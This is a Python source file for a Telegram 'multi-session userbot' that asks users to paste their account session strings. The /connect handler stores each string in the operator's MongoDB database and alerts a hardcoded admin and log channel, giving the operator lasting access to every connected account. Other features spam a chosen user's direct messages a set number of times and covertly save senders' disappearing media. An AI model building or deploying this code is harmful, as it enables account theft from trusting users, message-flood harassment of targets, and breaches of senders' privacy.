import os
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, CallbackQueryHandler, filters
)
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = -1002753939875
ADMIN_ID = 7755789304

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("bot")

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

# Track running clients
running_clients = {}

# Telegram Bot App
app = ApplicationBuilder().token(BOT_TOKEN).build()

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Help", callback_data="help")]]
    await update.message.reply_text(
        "👋 Welcome to the Multi-Session UserBot!\nUse /connect <session_string> to connect your account.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# /help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 Commands:\n"
        "/connect <SESSION_STRING> - Connect your account\n"
        ".dmspam or /dmspam <username> <count> <message> - Spam someone's DM\n"
        "🛡️ Disappearing media is auto-saved to Saved Messages."
    )

# /connect command
async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("❌ Please provide a valid session string.")
        return

    session_string = context.args[0]
    user_id = update.effective_user.id

    await sessions.update_one({"_id": user_id}, {"$set": {"session": session_string}}, upsert=True)

    await context.bot.send_message(
        chat_id=LOG_CHANNEL_ID,
        text=f"🔐 New session received from user `{user_id}`"
    )

    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await update.message.reply_text("❌ Session not authorized. Login needed.")
            return

    except SessionPasswordNeededError:
        await update.message.reply_text("❌ 2FA Password required. Cannot connect this session.")
        return
    except Exception as e:
        logger.error(f"Session connect error: {e}")
        await update.message.reply_text("❌ Failed to connect session.")
        return

    try:
        me = await client.get_me()
        running_clients[user_id] = client

        await client.send_message("me", "✅ Your UserBot is now connected and running!")

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"✅ Session connected:\n• ID: `{me.id}`\n• Username: @{me.username or 'N/A'}"
        )

        # Media Save Handler
        @client.on(events.NewMessage(incoming=True))
        async def media_handler(event):
            if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
                try:
                    await client.send_file(
                        "me",
                        event.media,
                        caption=f"🕒 Saved disappearing media from {event.sender_id} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )
                except Exception as e:
                    logger.warning(f"Media save failed: {e}")

        # DM Spam Handler (.dmspam)
        @client.on(events.NewMessage(pattern=r"[./]dmspam (.+) (\d+) (.+)", outgoing=True))
        async def dmspam_handler(event):
            try:
                username, count, msg = event.pattern_match.groups()
                count = int(count)
                user = await client.get_entity(username)
                for _ in range(count):
                    await client.send_message(user, msg)
                await event.reply(f"✅ Sent {count} messages to {username}")
            except Exception as e:
                await event.reply(f"❌ Spam failed: {e}")

        async def run_client():
            await client.run_until_disconnected()

        asyncio.create_task(run_client())
        await update.message.reply_text("✅ Session connected and running.")

    except Exception as e:
        logger.error(f"Session finalization error: {e}")
        await update.message.reply_text("❌ Unexpected error during session connection.")

# Optional: Bot-side /dmspam handler
async def dmspam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /dmspam <username> <count> <message>")
        return

    username = context.args[0]
    try:
        count = int(context.args[1])
        message = ' '.join(context.args[2:])
        client = running_clients.get(update.effective_user.id)
        if not client:
            await update.message.reply_text("❌ No session found. Please /connect first.")
            return
        user = await client.get_entity(username)
        for _ in range(count):
            await client.send_message(user, message)
        await update.message.reply_text(f"✅ Sent {count} messages to {username}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")

# CallbackQuery handler
async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query.data == "help":
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(
            "📖 Commands:\n"
            "/connect <SESSION_STRING> - Connect your account\n"
            ".dmspam or /dmspam <username> <count> <message> - Spam someone's DM\n"
            "🛡️ Disappearing media is auto-saved to Saved Messages."
        )

# Add all handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("connect", connect))
app.add_handler(CommandHandler("dmspam", dmspam_command))  # Optional bot-side
app.add_handler(CallbackQueryHandler(callback_query))

# Run the bot
print("🤖 Bot is running...")
app.run_polling()
